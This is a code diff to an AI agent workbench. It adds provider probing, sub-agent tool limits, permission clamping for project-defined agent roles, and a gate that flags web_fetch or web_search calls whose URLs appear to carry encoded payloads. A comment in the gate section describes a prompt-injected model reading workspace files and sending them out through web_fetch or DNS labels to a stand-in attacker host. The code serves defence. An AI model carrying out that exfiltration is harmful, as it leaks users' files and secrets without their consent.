@@ -9,7 +9,14 @@ async function fetchOpenAiModels(provider, timeoutMs = 4000) {
   try {
     const res = await fetch(modelsUrl, { headers, signal: ctrl ? ctrl.signal : undefined });
     if (!res || !res.ok) return { ok: false, error: 'HTTP ' + (res ? res.status : '?'), models: [] };
-    const body = await res.json();
+    // 200 却不是 JSON(/models 被 SPA 兜底页 / 反代的登录页 / 空体顶掉):这不是「连接失败」,是「这个端点没有模型清单」。
+    // 带 notAList 交给「测试连接」当缺清单处理(改用补全试探);超时中止(AbortError)照旧往外抛给下面的 catch。
+    let body;
+    try { body = await res.json(); }
+    catch (parseError) {
+      if (parseError && parseError.name === 'AbortError') throw parseError;
+      return { ok: false, error: 'HTTP ' + res.status + ': the response is not a model list (not JSON)', notAList: true, models: [] };
+    }
     const data = Array.isArray(body && body.data) ? body.data : (Array.isArray(body) ? body : []);
     // v1.0.2-S2: 同时保留上游条目里的 context_length 类字段(取第一个正数), 存为 contextLength,
     // 并按 provider+model 写入探测缓存(TTL 10 分钟), 供 providerContextWindow 解析激活模型时查用。
@@ -53,6 +60,29 @@ async function fetchOpenAiModels(provider, timeoutMs = 4000) {
     return { ok: false, error: (e && e.name === 'AbortError') ? 'timeout' : ((e && e.message) || 'fetch failed'), models: [] };
   } finally { if (timer) clearTimeout(timer); }
 }
+// 「测试连接」的第二条路:端点不提供模型清单(多数 Anthropic 兼容网关的 /anthropic/v1/models 是 404,一些 OpenAI 兼容
+// 内网网关也没有 /models)时,用填好的模型发一次最小的非流式补全来确认地址、密钥与模型都对。用短补全的编码(400 token、
+// 尽量关思考),失败时回 'HTTP <status>: <正文开头>' 供调用方分类。Never throws.
+async function probeProviderCompletion(provider, model, timeoutMs = 15000) {
+  const wire = providerWireProtocol(provider);
+  const url = wire.completionUrl(provider && provider.baseUrl);
+  if (!url || typeof fetch !== 'function') return { ok: false, error: url ? 'fetch unavailable' : 'no base URL' };
+  const body = wire.encodeQuick({ model, messages: [{ role: 'user', content: 'ping' }], plain: true, provider });
+  const ctrl = typeof AbortController === 'function' ? new AbortController() : null;
+  const timer = ctrl ? setTimeout(() => { try { ctrl.abort(); } catch { /* ignore */ } }, timeoutMs) : null;
+  try {
+    const res = await fetch(url, { method: 'POST', headers: wire.requestHeaders(provider, { model }), body: JSON.stringify(body), signal: ctrl ? ctrl.signal : undefined });
+    const raw = await res.text().catch(() => '');
+    // 报文原样回给界面之前,先把本次请求带出去的凭据按字面抹掉再截断(先截会把横跨 300 字边界的 key 切成认不出的半截)。
+    if (!res.ok) return { ok: false, status: res.status, error: 'HTTP ' + res.status + (raw ? ': ' + providerScrubSecrets(raw, provider).replace(/\s+/g, ' ').slice(0, 300) : '') };
+    let payload = null; try { payload = JSON.parse(raw); } catch { payload = null; }
+    const decoded = payload ? wire.decodeCompletion(payload, { requestModel: model }) : null;
+    if (decoded && decoded.failed) return { ok: false, error: String(decoded.failureText || 'provider error').slice(0, 300) };
+    return { ok: true };
+  } catch (e) {
+    return { ok: false, error: (e && e.name === 'AbortError') ? 'timeout' : ((e && e.message) || 'fetch failed') };
+  } finally { if (timer) clearTimeout(timer); }
+}
 // v0.6: expose the workbench's own tools to a native provider as OpenAI function-calling schema.
 // Same tools the MCP server exposes (minus the internal permission bridge), filtered by the
 // command/desktop toggles. The native agent loop executes them in-process via toolCall().
@@ -60,10 +90,15 @@ async function fetchOpenAiModels(provider, timeoutMs = 4000) {
 // passes none, preserving prior behavior):
 //   opts.tierFilter : 'read' | 'edit' | 'exec' — keep only tools at or below this native tier (used by
 //     runSubAgent to enforce toolTier: read=only read-tier, edit=read+edit, exec=all). Absent → no filter.
+//   opts.noMemoryWriteTools : true → 不 offer 记忆写工具(propose / revise / relation_*;子代理用,见 MEMORY_WRITE_TOOL_NAMES)
 //   opts.noAgentTools : true → never include the agent tools orchestrate_agents / wait_agents / agent_result
 //     (禁嵌套: sub-turns pass this). The top-level turn omits it and lets the subagentMaxPerTurn>0 check decide.
 // 代理模式 v2:模型侧的三个代理工具(单一启动入口 + 收件 + 取全文)。offer 门、禁嵌套压制、按需装载分类共用这张表。
 const AGENT_TOOL_NAMES = new Set(['orchestrate_agents', 'wait_agents', 'agent_result']);
+// 走查 #15:子代理不拿的记忆【写】工具。它们只写候选槽,而候选槽是父会话每回合唯一的一个 —— 子代理以 parentSession 的身份调用,
+// 写了就占掉主模型的槽(同回合先到者胜,主模型反而得到 alreadyPending),卡片上还看不出是谁提的。list / read 是只读,留着。
+// offer 面(buildOpenAiTools 的 opts.noMemoryWriteTools)与分发面(08 子代理循环的拒绝分支)共用这一张表。
+const MEMORY_WRITE_TOOL_NAMES = new Set(['workbench_memory_propose', 'workbench_memory_revise', 'workbench_memory_relation_propose', 'workbench_memory_relation_revoke']);
 function adaptiveMetaToolSchemas(includeInvoke = false) {
   const tools = [
     {
@@ -245,6 +280,7 @@ function buildOpenAiTools(config, caps, opts) {
     if (t.name === 'permission_prompt') continue;
     if (t.name === 'request_user_input' && noAgentTools) continue;
     if (AGENT_TOOL_NAMES.has(t.name) && !agentToolsEnabled) continue;
+    if (opts && opts.noMemoryWriteTools === true && MEMORY_WRITE_TOOL_NAMES.has(t.name)) continue;
     if (nativeToolDisabledByPolicy(t.name, config, desktopOverride)) continue; // allowCommandTools / allowDesktopTools(offer 与分发共用同一判据)
     // 105a: observation_recall 仅在 recall+reducer 双开关生效时 offer;默认关 → 不出现在工具集。
     if (t.name === 'observation_recall' && !observationRecallEnabled(config)) continue;
@@ -1436,20 +1472,119 @@ function estimateToolSchemaTokens(tools) {
 // 清单的纪律是「宁可误判成要人按,不可漏判成自动执行」,两个判据各写一份必然漂移。
 // toolName 缺省(调用方没传)一律回落 'ask':保守优先,新调用面忘了传参不会静默放权。
 // 模块方向:07 调 06i 是后向边(06i 在 manifest 里排 18,07 排 23),合法。
+// 安全走查 S1(读档联网是无提示外传通道):web_fetch / web_search 在 NATIVE_TOOL_TIER 里是 read 档,nativeToolGate 对 read 在所有档位都放行 ——
+// 被提示注入的模型可以 file_read 工作区里任何文件,再 web_fetch("https://攻击者/?d=<内容>") 无提示外传(SSRF 闸只挡内网,不挡公网目的地)。
+// 联网搜索 / 抓取本身仍是 read 档(不整体变成要确认:日常研究要能无打扰地跑),但【看起来带了载荷】的请求在除 bypass 以外的所有档位先停下来问:
+//   · 网址的查询串 + fragment 总长 > 256;
+//   · 任一查询参数的值(解码后)> 128;
+//   · 路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 连续串,或「像 base64」的连续串(见 webLooksEncoded);
+//   · 主机名里有 ≥ 48 字符的单个标签(DNS 外传:<编码数据>.攻击者.com;DNS 标签上限 63);
+//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
+// 阈值依据:正常抓取 / 搜索的网址查询串几乎都在 100 字以内(搜索引擎结果页 ?q=…&hl=…、分页、utm 追踪参数一般 < 150),单个参数值很少过 100;
+// 常见的长 ID 都 < 64:git 提交 SHA-1 40 位、Notion / Google Docs 文档 ID 32~44 位、UUID 36 位;256 / 128 / 64 都留了余量,又足以把「整份文件内容塞进网址」拦下。
+// 没覆盖的(诚实):低于阈值的小额外传(一个 API key 约 50 字符、一个 32 位 token 能从阈值下面过去)—— 这条挡的是批量载荷,不是逐字符审计;
+// 要杜绝得对「本回合读过本地文件之后的新域名」做确认(产品形态变更,未做)。
+// 同一判据覆盖 http_request / http_download 的网址(读档以上的同类外联口:GET 带长查询串同样能外传),以及 CLI 引擎的 WebFetch / WebSearch。
+// 第三波(复核 #2 / #7):另加三条整体长度判据 —— pathChars(路径【解码后】总长)、hostChars(主机名总长)、urlChars(整条网址原长);
+// 查询串 / fragment 的 256 改按【解码后】计(中文搜索词一个字符编码成 9 个字符,30 个汉字就超了);用户信息段(`user:pass@`)一律问
+// (Node 会把它发成 Authorization 头 —— 无提示外传通道;web_fetch 没有任何理由带凭据)。阈值依据:真实网址路径解码后极少过 200,
+// 合法主机名几乎不超过 70(codespaces / vercel 预览域 ~60),整条网址过 1024 已超出多数服务端的 URL 上限。
+const WEB_PAYLOAD_LIMITS = Object.freeze({ queryFragmentChars: 256, paramValueChars: 128, encodedRunChars: 64, hostLabelChars: 48, searchQueryChars: 300, pathChars: 300, hostChars: 100, urlChars: 1024 });
+// 第三波(复核 #3):browser_open(原生与 ACC 的同名工具)= 把网址交给浏览器去 GET,ACC 的 fetch 同理;裸名匹配,mcp__server__ 前缀已被 webPayloadReason 剥掉。
+// (ACC 的 browser_navigate 只有 back / forward / reload,没有网址入参,不在此列;管家的 steward_web_fetch / steward_web_search 不走本闸,见 13l。)
+const WEB_PAYLOAD_URL_TOOLS = Object.freeze(['web_fetch', 'WebFetch', 'http_request', 'http_download', 'browser_open', 'fetch']);
+const WEB_PAYLOAD_QUERY_TOOLS = Object.freeze(['web_search', 'WebSearch']);
+// 「像编码出来的」:≥ encodedRunChars 的 hex 连续串;或 [A-Za-z0-9+/_=-] 连续串(base64 / base64url),且同时有字母和数字、连字符 / 下划线占比 ≤ 1/8
+// (长文章 slug 如 how-to-install-…-2026 连字符多、词与词之间有分隔,不算;真 base64url 里 - _ 的期望占比约 3%)。
+function webLooksEncoded(text) {
+  const t = String(text == null ? '' : text);
+  const n = WEB_PAYLOAD_LIMITS.encodedRunChars;
+  if (t.length < n) return false;
+  if (new RegExp('[0-9a-fA-F]{' + n + ',}').test(t)) return true;
+  const runs = t.match(new RegExp('[A-Za-z0-9+/_=-]{' + n + ',}', 'g')) || [];
+  for (const run of runs) {
+    if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) continue;
+    const seps = (run.match(/[-_]/g) || []).length;
+    if (seps * 8 > run.length) continue;
+    return true;
+  }
+  return false;
+}
+// 只做百分号解码,【不】把 + 当空格:标准 base64 里的 + 若按表单语义变成空格,连续串就被切断,载荷反而躲过了编码串判据(长度判据不受影响)。
+function webSafeDecode(s) {
+  const raw = String(s == null ? '' : s);
+  try { return decodeURIComponent(raw); } catch { return raw; }
+}
+// 返回 '' = 不像载荷;否则是命中的判据名(进日志 / 子代理拒绝文案)。纯函数,不碰网络、不做 DNS。
+function webUrlPayloadReason(url) {
+  const s = String(url == null ? '' : url).trim();
+  if (!s) return '';
+  const hashAt = s.indexOf('#');
+  const frag = hashAt >= 0 ? s.slice(hashAt + 1) : '';
+  const noHash = hashAt >= 0 ? s.slice(0, hashAt) : s;
+  const qAt = noHash.indexOf('?');
+  const query = qAt >= 0 ? noHash.slice(qAt + 1) : '';
+  const head = qAt >= 0 ? noHash.slice(0, qAt) : noHash;
+  if (s.length > WEB_PAYLOAD_LIMITS.urlChars) return 'url_long';
+  if (webSafeDecode(query).length + webSafeDecode(frag).length > WEB_PAYLOAD_LIMITS.queryFragmentChars) return 'query_fragment_long';
+  const afterScheme = head.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
+  const slashAt = afterScheme.indexOf('/');
+  const hostPort = slashAt >= 0 ? afterScheme.slice(0, slashAt) : afterScheme;
+  const pathPart = slashAt >= 0 ? afterScheme.slice(slashAt) : '';
+  // 用户信息段:带口令(`user:pass@`)或长到能装数据(> 32 字符)一律问;`http://user@intranet.corp:8080/…` 这种只有短用户名的内网写法不算(既有零误伤样本)。
+  const atAt = hostPort.lastIndexOf('@');
+  if (atAt >= 0) { const userinfo = hostPort.slice(0, atAt); if (userinfo.length > 32 || userinfo.includes(':')) return 'userinfo'; }
+  const host = (atAt >= 0 ? hostPort.slice(atAt + 1) : hostPort).replace(/:\d*$/, '');
+  if (host.length > WEB_PAYLOAD_LIMITS.hostChars) return 'host_long';
+  if (host.split('.').some(label => label.length >= WEB_PAYLOAD_LIMITS.hostLabelChars)) return 'host_label_long';
+  if (webSafeDecode(pathPart).length > WEB_PAYLOAD_LIMITS.pathChars) return 'path_long';
+  const values = [];
+  for (const pair of query.split('&')) {
+    if (!pair) continue;
+    const eq = pair.indexOf('=');
+    values.push(webSafeDecode(eq >= 0 ? pair.slice(eq + 1) : pair));
+  }
+  if (values.some(v => v.length > WEB_PAYLOAD_LIMITS.paramValueChars)) return 'param_long';
+  // 第三波(复核 #7):`#diff-<64 位 hex>`(GitHub 的 diff 锚点)与 `sha256-<64 位 hex>` / `sha256:<64 位 hex>`(镜像 / 包的摘要)恰好 64 位 hex,是日常网址里
+  // 仅有的几种「像编码」的正常写法;只摘掉【恰好 64 位】的这两种前缀形态再判(128 位 hex 之类仍命中),整体长度另有 pathChars / urlChars 兜着。
+  const withoutDigests = piece => piece.replace(/(?:sha256[-:]|diff-)[0-9a-fA-F]{64}(?![0-9a-fA-F])/gi, '');
+  const pieces = [...pathPart.split('/').map(webSafeDecode), ...values, webSafeDecode(frag)].map(withoutDigests);
+  if (pieces.some(webLooksEncoded)) return 'encoded_run';
+  return '';
+}
+// 工具名容忍 serverId__ / mcp__server__ 前缀(Claude 引擎经 MCP 叫的是 mcp__ruyi__web_fetch)。
+function webPayloadReason(toolName, input) {
+  const bare = String(toolName == null ? '' : toolName).replace(/^.*__/, '');
+  if (!input || typeof input !== 'object' || Array.isArray(input)) return '';
+  if (WEB_PAYLOAD_QUERY_TOOLS.includes(bare)) {
+    const q = String(input.query == null ? '' : input.query);
+    if (q.length > WEB_PAYLOAD_LIMITS.searchQueryChars) return 'search_query_long';
+    if (q.split(/\s+/).some(webLooksEncoded)) return 'search_encoded_run';
+    return '';
+  }
+  if (WEB_PAYLOAD_URL_TOOLS.includes(bare)) return webUrlPayloadReason(input.url);
+  return '';
+}
 function nativeToolGate(mode, tier, toolName, input) {
   // v1.4.3: accept both 'bypass' (internal) and 'bypassPermissions' (CLI-native) as full-bypass
   if (mode === 'bypass' || mode === 'bypassPermissions') return 'allow';
-  if (tier === 'read') return 'allow';
+  // 安全走查 S1:联网请求看起来带了载荷 → 除 bypass 以外所有档位(含 plan、read 档)先确认;走既有的权限请求,不另造一套。
+  // 第三波(复核):载荷这一问只把本来的 allow 升成 ask,【不】把 block 放宽成 ask —— plan / dontAsk 档里本来就被挡的 exec / edit 工具(http_request / browser_open 等)带长网址仍是 block。
+  const payloadAsk = toolName && webPayloadReason(toolName, input) ? 'ask' : 'allow';
+  if (tier === 'read') return payloadAsk;
   if (mode === 'plan' || mode === 'dontAsk') return 'block';
   // v1.4.3: 'auto' mode — AI risk-classifier decides. In the native engine we approximate:
   // allow edit-tier (low-risk, reversible) and prompt for exec-tier.
-  if (mode === 'auto' && tier === 'edit') return 'allow';
-  if (mode === 'acceptEdits' && tier === 'edit') return 'allow';
+  if (mode === 'auto' && tier === 'edit') return payloadAsk;
+  if (mode === 'acceptEdits' && tier === 'edit') return payloadAsk;
   if (mode === 'auto') {
     if (!toolName) return 'ask';                                    // 调用方没给名字 = 保守问
     // 2026-10:命令是拼出来 / 编码出来 / 求值出来的(强信号,06i stewardAutoAskIndirect)也停下来问 ——
     // 字面量判据看不穿它真正要跑什么。管家对这一类不代批(13l),只能用户亲自按。
-    return (stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input)) ? 'ask' : 'allow';
+    // 安全走查 S2:网络外发与读数据根密钥文件(06i stewardAutoAskSensitiveKind)同样停下来问;命令类工具才扫,编排类的任务描述文字不扫。
+    // 第三波(复核 #4):摊平文本超出扫描窗口的(窗口之后没人看过)同样问 —— 见 06i stewardAutoAskScanIncomplete。
+    return (payloadAsk === 'ask' || stewardToolPermanentlyExempt(toolName, input) || stewardAutoAskIndirect(input) || stewardAutoAskSensitiveKind(toolName, input) !== ''
+      || stewardAutoAskScanIncomplete(toolName, input)) ? 'ask' : 'allow';
   }
   return 'ask';
 }
@@ -1757,7 +1892,7 @@ async function openAiStreamOnce({ chatUrl, headers, body, ctrl, onEvent, markUsa
     }
     // 58 号批 2:协议内的兼容重打(Anthropic:思考块签名校验失败 → 去掉思考块;网关不认 thinking / output_config 等 → 去掉点名字段)。
     // chat / responses 恒返回 null,走下面原有的 stream_options 分支,行为不变。
-    const retryBody = wire.retryOn400(body, t);
+    const retryBody = wire.retryOn400(body, t, { url: chatUrl });   // url:从 400 学到的 max_tokens 上限记在「这个端点 + 这个模型」名下
     if (retryBody) {
       res = await doFetch(retryBody);
     } else if (body.stream_options && /stream_options|include_usage|unsupported|unknown|not\s*support/i.test(t)) {
@@ -1775,7 +1910,12 @@ async function openAiStreamOnce({ chatUrl, headers, body, ctrl, onEvent, markUsa
     // endpoint. This is still a pre-first-byte failure (we только read the error body, not an SSE stream).
     // Auth/request/rate-limit statuses (401/403/400/404/422/429) carry NO failoverStatus → caller won't switch.
     const failoverStatus = (res && FAILOVER_HTTP_STATUSES.has(res.status)) ? res.status : undefined;
-    return { httpError: `HTTP ${res ? res.status : '?'}${d ? ': ' + redact(d.slice(0, 500)) : ''}`, toolsRejected: /tool|function/i.test(d), failoverStatus, text: '', reasoning: '', toolCalls: [] };
+    // 「工具被拒」只在 400 / 422(请求体校验类)时才有意义:修前对【所有】非 ok 状态都按 /tool|function/ 打标,
+    // 一发 500 的正文里带 "function dispatcher" 就让 09 整回合去掉工具重打、回合还报 ok:true。
+    const toolsRejectedStatus = Boolean(res && (res.status === 400 || res.status === 422));
+    // Retry-After(429 / 503 常带;秒或 HTTP 日期,封顶 30 s):带出给调用方的退避取 max(自己的退避, 它)。没有 / 认不出不带这个键。
+    const retryAfterMs = res && res.headers && typeof res.headers.get === 'function' ? providerRetryAfterMs(name => res.headers.get(name), Date.now()) : 0;
+    return { httpError: `HTTP ${res ? res.status : '?'}${d ? ': ' + redact(d.slice(0, 500)) : ''}`, toolsRejected: toolsRejectedStatus && /tool|function/i.test(d), failoverStatus, ...(retryAfterMs > 0 ? { retryAfterMs } : {}), text: '', reasoning: '', toolCalls: [] };
   }
   // Non-streaming fallback: single JSON body. The protocol decoder normalizes it to the same
   // { text, reasoning, toolCalls } shape so every caller is protocol-agnostic.
@@ -1786,11 +1926,16 @@ async function openAiStreamOnce({ chatUrl, headers, body, ctrl, onEvent, markUsa
   if (!res.body || typeof res.body.getReader !== 'function' || jsonBody) {
     const j = await res.json().catch(() => null);
     const d = wire.decodeCompletion(j, { requestModel: body.model });
+    // 回体本身装着失败(200 + 顶层 error、Responses status:'failed'、Anthropic type:'error' / refusal):与流式分支一致地报 httpError。
+    // 修前这里把 failed / failedDetail 全丢了,落成「空回复」,真因(额度用尽 / 拒答 / 服务端报错)用户看不到。用量照记(失败那一发也花了钱)。
+    if (d.usage) markUsage(d.usage);
+    if (d.failureText) {
+      return { text: d.text, reasoning: d.reasoning, finishReason: 'error', toolCalls: [], httpError: redact(String(d.failureText).slice(0, 500)), providerResponseId: d.responseId };
+    }
     // E6: surface reasoning before content, matching the streaming order (a non-streaming endpoint's reasoning
     // chain used to be invisible in the UI).
     if (d.reasoning) onEvent({ type: 'thinking_delta', text: d.reasoning });
     if (d.text) onEvent({ type: 'assistant_delta', text: d.text });
-    if (d.usage) markUsage(d.usage);
     return { text: d.text, reasoning: d.reasoning, toolCalls: d.toolCalls, finishReason: d.finishReason, providerResponseId: d.responseId, ...(d.providerBlocks ? { providerBlocks: d.providerBlocks } : {}) };
   }
   const reader = res.body.getReader();
@@ -1835,7 +1980,15 @@ async function openAiStreamOnce({ chatUrl, headers, body, ctrl, onEvent, markUsa
     return false;
   };
   while (!done) {
-    const r = await reader.read();
+    let r;
+    try { r = await reader.read(); }
+    catch (e) {
+      // 流中途断线:undici 抛的是 TypeError('terminated'),真因(other side closed / UND_ERR_SOCKET / ECONNRESET)只挂在 e.cause。
+      // 把它并进 message(原错误对象照旧上抛,name / cause / 栈都在):回合的 errorMsg 与 errorClass 才看得出这是掉线。
+      // 中止(用户 Stop / 看门狗)原样上抛,09 靠 e.name === 'AbortError' 认它。
+      if (e && e.name !== 'AbortError' && e.cause) { try { e.message = providerThrownErrorText(e); } catch { /* 只读 message:保持原样 */ } }
+      throw e;
+    }
     if (r.done) break;
     touch();
     buf += decoder.decode(r.value, { stream: true });
@@ -1976,7 +2129,17 @@ async function finalizeAgentWorktree(isolation, runId, nodeId) {
     isolation.path = ''; return isolation;
   }
   await gitExec(isolation.path, ['add', '-A']);
-  await gitExec(isolation.path, ['-c', 'user.name=Ruyi Agent', '-c', 'user.email=agent@ruyi.local', 'commit', '-m', `agent(${nodeId}): isolated result for ${runId}`], 60000);
+  // 走查 W1·F5:这是工作台自己给隔离节点拍的内部快照提交,不是用户的提交 —— 不能受用户仓库配置牵连:
+  //   · pre-commit / commit-msg 钩子(lint、测试、commitlint)会让快照失败,整个隔离节点跟着报错 → --no-verify;
+  //     prepare-commit-msg / post-commit 钩子(commitizen、通知脚本)--no-verify 管不到,worktree 与主仓共用钩子目录,
+  //     所以再把 core.hooksPath 指到一个不存在的目录,一并不跑;
+  //   · commit.gpgsign=true 在没有 gpg / 没有私钥的环境里直接报错 → 显式关掉。
+  //   user.name / user.email 照旧用 -c 注入(用户没配身份时也提得成)。
+  await gitExec(isolation.path, [
+    '-c', 'user.name=Ruyi Agent', '-c', 'user.email=agent@ruyi.local', '-c', 'commit.gpgsign=false',
+    '-c', 'core.hooksPath=' + path.join(paths.agentWorktrees, '.no-hooks'),
+    'commit', '--no-verify', '-m', `agent(${nodeId}): isolated result for ${runId}`,
+  ], 60000);
   isolation.commit = await gitExec(isolation.path, ['rev-parse', 'HEAD']);
   isolation.status = 'ready'; isolation.completedAt = nowIso(); isolation.changeSummary = changes.split(/\r?\n/).slice(0, 100);
   return isolation;
@@ -2062,7 +2225,10 @@ async function readClaudeProjectAgentRoles(cwd) {
   }
   return out;
 }
-async function getAgentRoleLibrary(cwd, config) {
+// 安全走查 S3:opts.parentMode = 调用方认的父回合档位(缺省取 config.permissionMode —— 回合内的 config 已解析成这条线程的档)。
+// 项目来源的角色(.ruyi/agents.json / .claude/agents)在返回时带上【有效档位】标注(effectivePermissionMode / effectiveToolTier / roleClamped),
+// 角色自己声明的 permissionMode / toolTier 原样保留(设置页编辑器原样存回);真正的夹紧在子代理起跑处(08 / 07)按那一刻的父档再算一次。
+async function getAgentRoleLibrary(cwd, config, opts) {
   const merged = new Map();
   for (const raw of BUILTIN_AGENT_ROLES) { const role = normalizeAgentRole(raw, { source: 'builtin', builtin: true }); merged.set(role.id, role); }
   for (const role of (Array.isArray(config.agentRoleOverrides) ? config.agentRoleOverrides : [])) {
@@ -2073,7 +2239,15 @@ async function getAgentRoleLibrary(cwd, config) {
   }
   const claudeNative = await readClaudeProjectAgentRoles(cwd);
   for (const role of claudeNative) if (!merged.has(role.id)) merged.set(role.id, role);
-  return [...merged.values()].filter(Boolean);
+  const parentMode = (opts && opts.parentMode) || (config && config.permissionMode) || 'default';
+  return [...merged.values()].filter(Boolean).map(role => annotateAgentRoleEffective(role, parentMode));
+}
+// 项目级写入(.ruyi/agents.json、.ruyi/workflows.json)的 cwd 来自请求体:目录不存在或是个文件时,下面的 mkdir 会抛
+// ENOTDIR / EEXIST,路由兜底成 500,还把带宿主路径的 errno 原文回给前端。写前先 stat 一下:不是目录就回 400 人话
+// (不回显路径)。返回 null = 可写;否则是一份 apiFailure 响应,调用方直接 send。
+async function projectCwdDirectoryFailure(cwd) {
+  try { if ((await fsp.stat(path.resolve(String(cwd || '')))).isDirectory()) return null; } catch { /* 不存在:同样按「不是目录」答 */ }
+  return apiFailure('project.cwd_not_directory', {}, '工作文件夹不存在或不是目录,无法保存项目级配置', 400);
 }
 async function saveProjectAgentRoles(cwd, roles) {
   const file = projectAgentRoleFile(cwd), dir = path.dirname(file);
@@ -2094,7 +2268,8 @@ async function buildClaudeAgentDefinitions(cwd, config, jsonBudget = 6000) {
     const d = { description: role.description || role.label, prompt: role.prompt || role.description || role.label };
     if (role.claudeTools && role.claudeTools.length) d.tools = role.claudeTools;
     if (role.models && role.models.claude && role.models.claude !== 'inherit') d.model = role.models.claude;
-    const pm = claudePermissionMode(role.permissionMode); if (pm) d.permissionMode = pm;
+    // 安全走查 S3:项目来源的角色把权限档夹到不高于这一回合的线程档位再交给 CLI(CLI 的 --agents 子代理按这个档起跑,不夹就能靠项目角色放宽)。
+    const pm = claudePermissionMode(clampAgentRoleToParent(role, role.toolTier, config && config.permissionMode).permissionMode || role.permissionMode); if (pm) d.permissionMode = pm;
     if (role.mcpServers && role.mcpServers.length) d.mcpServers = role.mcpServers;
     if (role.budgets && role.budgets.claude) d.maxTurns = role.budgets.claude;
     if (role.isolation === 'worktree') d.isolation = 'worktree';
@@ -2226,10 +2401,14 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
       iters: 0, toolCalls: 0 };
   }
   const role = roleDefinition || null;
-  const tier = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
+  const tier0 = (toolTier === 'edit' || toolTier === 'exec') ? toolTier : 'read';
   const subModel = String(model || (role && role.models && role.models.claude !== 'inherit' && role.models.claude) || '').trim();
 
-  const roleMode = role && role.permissionMode && role.permissionMode !== 'inherit' ? role.permissionMode : '';
+  // 安全走查 S3:项目来源的角色(.ruyi/agents.json 等)把有效权限档 / 工具级夹到不高于父回合档位;builtin / global 来源逐字不变。
+  const roleGuard = clampAgentRoleToParent(role, tier0, permModeOverride === 'plan' ? 'plan' : (permModeOverride || config.permissionMode || 'default'));
+  const tier = roleGuard.toolTier;
+  if (roleGuard.clamped) { try { logEvent({ kind: 'agent_role_clamped', engine: 'claude', roleId: role && role.id || '', source: role && role.source || '', clamped: roleGuard.clamped }); } catch { /* 遥测不阻断 */ } }
+  const roleMode = roleGuard.permissionMode;
   // 线程 / 工作流下发的只做计划档压过角色自带的档(与 OpenAI 路径 08 runSubAgentCoreBody 同一条优先级)。
   const requestedMode = permModeOverride === 'plan' ? 'plan' : (roleMode || permModeOverride || config.permissionMode || 'default');
   const grant = claudeSubagentPermission(requestedMode, tier, role && role.claudeTools);
@@ -2294,11 +2473,13 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
   const env = effectiveAnthropicEnv(config);
   if (fakeClaude) env.WCW_FAKE_INTERACTIVE = '1';
 
-  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: role && role.permissionMode || 'inherit', mcpServers: roleMcpServers, engine: 'claude' });
+  onEvent({ type: 'subagent', id: subagentId, state: 'start', task: String(displayTask != null ? displayTask : task || ''), toolTier: tier, agentKey, dependsOn: dependsOn || [], roleId: role && role.id || '', roleLabel: role && role.label || '', model: subModel || 'inherit', permissionMode: roleGuard.permissionMode || 'inherit', ...(roleGuard.clamped ? { roleClamped: roleGuard.clamped } : {}), mcpServers: roleMcpServers, engine: 'claude' });
 
   const workingDir = cwd || process.cwd();
   await fsp.mkdir(workingDir, { recursive: true }).catch(() => {});
-  const idleLimitMs = Math.min(Number(config.turnIdleTimeoutMs) || 600000, 600000);
+  // Claude CLI 节点的空闲上限跟用户设置走(turnIdleTimeoutMs,出厂 10 分钟,可调到 60 分钟)。修前这里还封了一道 10 分钟的顶
+  // (Math.min(…, 600000)),于是把「一个回合多久没动静算卡住」调大对 Claude 节点完全无效。env 缝 WCW_TURN_IDLE_MS 与 05 的主回合同名同义。
+  const idleLimitMs = Math.max(1000, Number(process.env.WCW_TURN_IDLE_MS) || Number(config.turnIdleTimeoutMs) || 600000);
 
   // v1.4.5: transient-error resilience parity with runSubAgentCore (OpenAI path) + streamWithFailover
   // (parent turn). The CLI is retried inline a bounded number of times when a failure is classified
@@ -2377,7 +2558,7 @@ async function runClaudeSubAgentOnce({ config, parentSession, task, displayTask,
           // CLAUDE_PROGRESS_CHAR_STEP boundary so a long, tool-less generation shows live activity.
           if (assistantText.length - progressChars >= CLAUDE_PROGRESS_CHAR_STEP) {
             progressChars = assistantText.length;
-            onEvent({ type: 'subagent_progress', subagentId, chars: assistantText.length, note: `生成中 · ${assistantText.length} 字` });
+            onEvent({ type: 'subagent_progress', subagentId, chars: assistantText.length, note: `生成中 · ${assistantText.length} 字`, noteCode: 'generating' });   // 第三波 M4:note 是写日志的中文,noteCode 让前端按界面语言出字
           }
         }
         else if (ev.kind === 'tool_use') { toolCallCount += 1; onEvent({ type: 'tool_use', id: ev.id, name: ev.name, input: ev.input, subagentId }); }
